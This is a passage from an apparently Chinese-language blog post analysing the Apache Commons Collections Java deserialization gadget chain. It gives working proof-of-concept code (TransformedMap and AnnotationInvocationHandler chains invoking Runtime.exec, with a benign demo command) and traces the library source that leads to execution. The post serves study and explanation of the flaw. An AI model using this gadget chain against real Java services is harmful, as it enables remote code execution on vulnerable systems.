     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用TransformedMap类执行代码"><a href="#利用TransformedMap类执行代码" class="headerlink" title="利用TransformedMap类执行代码"></a>利用TransformedMap类执行代码</h2><p>以下为通过<code>org.apache.commons.collections.map.TransformedMap</code>类执行任意代码的示例，当执行最后的<code>localEntry.setValue(null);</code>后，会执行<code>Transformer</code>数组里的代码链。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TMExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Transformer[] transformer_exec_note = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/usr/bin/open /Applications/Notes.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformer_exec_note);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// outerMap类型为TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, chain);</span><br><span class="line">        <span class="comment">// set类型为AbstractInputCheckedMapDecorator$EntrySet</span></span><br><span class="line">        Set set = outerMap.entrySet();</span><br><span class="line">        <span class="comment">// localIterator类型为AbstractInputCheckedMapDecorator$EntrySetIterator</span></span><br><span class="line">        Iterator localIterator = set.iterator();</span><br><span class="line">        <span class="comment">// localEntry类型为AbstractInputCheckedMapDecorator$MapEntry</span></span><br><span class="line">        Map.Entry localEntry = (Map.Entry) localIterator.next();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 可以触发漏洞</span></span><br><span class="line">        localEntry.setValue(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>org.apache.commons.collections.map.TransformedMap</code>类的继承关系如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.map.TransformedMap</span><br><span class="line">|-org.apache.commons.collections.map.AbstractInputCheckedMapDecorator</span><br><span class="line">  |-org.apache.commons.collections.map.AbstractMapDecorator</span><br><span class="line">    |-java.util.Map</span><br></pre></td></tr></table></figure>
<p><strong>调用TransformedMap类的decorate方法</strong></p>
<p><code>TransformedMap</code>类的<code>decorate()</code>中创建了<code>TransformedMap</code>对象：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> </span></span><br><span class="line"><span class="class">    <span class="title">implement</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer,</span></span></span><br><span class="line"><span class="function"><span class="params">        Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer,</span></span></span><br><span class="line"><span class="function"><span class="params">        Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map); <span class="comment">// 调用AbstractInputCheckedMapDecorator的构造函数，最终保存为map成员变量</span></span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer; <span class="comment">// 保存为成员变量</span></span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>调用AbstractInputCheckedMapDecorator类的entrySet方法</strong></p>
<p><code>outerMap.entrySet()</code>调用了<code>TransformedMap</code>类的父类<code>AbstractInputCheckedMapDecorator</code>的<code>entrySet()</code>。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isSetValueChecking</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set <span class="title">entrySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isSetValueChecking()) &#123;</span><br><span class="line">            <span class="comment">// 创建EntrySet对象并返回，由于AbstractInputCheckedMapDecorator为抽象类，示例代码执行时，this为TransformedMap类的对象outerMap，this.map为innerMap</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> EntrySet(<span class="keyword">this</span>.map.entrySet(), <span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySet</span> <span class="keyword">extends</span> <span class="title">AbstractSetDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">EntrySet</span><span class="params">(Set set, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(set);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent; <span class="comment">// outerMap保存为成员变量</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>调用AbstractInputCheckedMapDecorator$EntrySet类的iterator()</strong></p>
<p><code>set.iterator()</code>调用了<code>AbstractInputCheckedMapDecorator$iterator</code>类的<code>iterator()</code>。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySet</span> <span class="keyword">extends</span> <span class="title">AbstractSetDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Iterator <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AbstractInputCheckedMapDecorator.EntrySetIterator(</span><br><span class="line">                <span class="keyword">this</span>.collection.iterator(), <span class="keyword">this</span>.parent);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySetIterator</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">EntrySetIterator</span><span class="params">(Iterator iterator,</span></span></span><br><span class="line"><span class="function"><span class="params">            AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(iterator);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>调用AbstractInputCheckedMapDecorator$EntrySetIterator类的next()</strong></p>
<p><code>localIterator.next()</code>调用了<code>AbstractInputCheckedMapDecorator$EntrySetIterator</code>类的<code>next()</code>。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySetIterator</span> <span class="keyword">extends</span> <span class="title">AbstractIteratorDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) <span class="keyword">this</span>.iterator.next();</span><br><span class="line">            <span class="comment">// 创建MapEntry类的对象并返回，this.parent在上述示例代码中为outerMap</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AbstractInputCheckedMapDecorator.MapEntry(entry, <span class="keyword">this</span>.parent);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent; <span class="comment">// outerMap被保存为成员变量</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>调用AbstractInputCheckedMapDecorator$MapEntry类的setValue()</strong></p>
<p><code>localEntry.setValue(null)</code>调用了AbstractInputCheckedMapDecorator$MapEntry类的<code>setValue()</code>。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value); <span class="comment">// 上述示例代码中，this.parent为outerMap，因此会调用TransformedMap类的checkSetValue()</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>TransformedMap</code>类的<code>checkSetValue()</code>中，会调用<code>this.valueTransformer.transform()</code>。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value); <span class="comment">// outerMap的this.valueTransformer对应chain对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上所述，上述示例代码执行<code>localEntry.setValue(null);</code>时，会执行<code>ConstantTransformer</code>与<code>InvokerTransformer</code>数组中的代码链。<br>在代码执行完<code>localIterator.next()</code>后，执行<code>localEntry.getKey()</code>与<code>localEntry.getValue()</code>可获取示例代码中通过<code>innerMap.put()</code>添加的键值对。</p>
<h2 id="利用TransformedMap与AnnotationInvocationHandler类执行代码"><a href="#利用TransformedMap与AnnotationInvocationHandler类执行代码" class="headerlink" title="利用TransformedMap与AnnotationInvocationHandler类执行代码"></a>利用TransformedMap与AnnotationInvocationHandler类执行代码</h2><p>目前的构造还依赖于触发<code>Map</code>中某一项去调用<code>setValue()</code>，需要想办法通过<code>readObject()</code>直接触发。发现<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类提供了方法接收<code>Map</code>对象，且在<code>readObject()</code>中会调用<code>Map</code>对象的Entry的<code>setValue()</code>。<br>以下为通过<code>TransformedMap</code>与<code>AnnotationInvocationHandler</code>类执行任意代码的示例，在执行<code>ois.readObject();</code>后，会执行Transformer数组中的代码链：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AIHExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, </span></span><br><span class="line"><span class="function">    SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, </span></span><br><span class="line"><span class="function">    InvocationTargetException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformer_exec_note = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/usr/bin/open /Applications/Notes.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformer_exec_note);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">// 下面设置key需要为&quot;value&quot;，且value不能为null，才能触发漏洞</span></span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;tttest&quot;</span>);</span><br><span class="line">        <span class="comment">// outerMap类型为TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, chain);</span><br><span class="line">        <span class="comment">// 调用未包含package中的构造函数，必须通过反射方式</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//需要用Retention类</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outerMap);</span><br><span class="line">        ByteArrayOutputStream byteOut = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(byteOut);</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(byteOut.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        <span class="comment">// 触发漏洞</span></span><br><span class="line">        Object object = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述触发漏洞的示例代码中，会调用<code>AnnotationInvocationHandler</code>类的带参数构造函数与<code>readObject()</code>。<code>AnnotationInvocationHandler</code>类的重要变量和方法如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ObjectmemberValues;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class paramClass, Map&lt;String, ObjectparamMap) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = paramClass; <span class="comment">// Retention.class</span></span><br><span class="line">        <span class="keyword">this</span>.memberValues = paramMap; <span class="comment">// 实例代码中的outerMap</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream paramObjectInputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        paramObjectInputStream.defaultReadObject();</span><br><span class="line">        AnnotationType localAnnotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            localAnnotationType = AnnotationType.getInstance(<span class="keyword">this</span>.type); <span class="comment">// this.type为Retention.class</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException localIllegalArgumentException) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Map localMap = localAnnotationType.memberTypes(); <span class="comment">// localMap存在一个键值对：key=&quot;value&quot;, value=&quot;java.lang.annotation.RetentionPolicy&quot;</span></span><br><span class="line">        Iterator localIterator = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// this.memberValues对应示例代码中outerMap</span></span><br><span class="line">        <span class="keyword">while</span> (localIterator.hasNext()) &#123;</span><br><span class="line">            Map.Entry localEntry = (Map.Entry) localIterator.next(); <span class="comment">// localEntry等价于outerMap.entrySet().iterator().next()</span></span><br><span class="line">            String str = (String) localEntry.getKey(); <span class="comment">// &quot;value&quot;</span></span><br><span class="line">            Class localClass = (Class) localMap.get(str); <span class="comment">// localMap的value即&quot;java.lang.annotation.RetentionPolicy&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (localClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object localObject = localEntry.getValue(); <span class="comment">// &quot;tttest&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> ((!(localClass.isInstance(localObject))) <span class="comment">// localObject不是localClass的实例</span></span><br><span class="line">                        &amp;&amp; (!(localObject <span class="keyword">instanceof</span> ExceptionProxy))) <span class="comment">// localObject不是ExceptionProxy的实例</span></span><br><span class="line">                    <span class="comment">// 调用了localEntry变量的setValue方法触发漏洞</span></span><br><span class="line">                    localEntry.setValue(<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                                    localObject.getClass() + <span class="string">&quot;[&quot;</span> + localObject</span><br><span class="line">                                            + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                                    .setMember((Method) localAnnotationType</span><br><span class="line">                                            .members().get(str)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
